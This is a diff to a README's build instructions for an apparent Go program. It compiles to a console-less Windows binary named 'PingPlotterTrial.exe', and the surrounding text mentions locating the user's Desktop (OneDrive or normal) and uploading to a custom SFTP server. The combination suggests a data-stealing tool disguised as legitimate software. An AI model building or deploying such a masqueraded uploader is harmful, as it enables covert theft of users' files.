@@ -7,6 +7,17 @@ Ability to handle if user is using a OneDrive Desktop or Normal Desktop.
 Set custom SFTP server, use flag " -sftp "sftp server address"
 
 **Building Binary**
+1. Download required packages
 ```
-go build -ldflags -H=windowsgui -o PingPlotterTrial.exe
+go get  "github.com/elastic/go-sysinfo"
+go get  "github.com/pkg/sftp"
+go get  "golang.org/x/crypto/ssh"
+
 ```
+
+2. build
+```
+go build -ldflags -H=windowsgui -o "\bin\PingPlotterTrial.exe" 
+
+```
+3. New Binary will be found in bin\
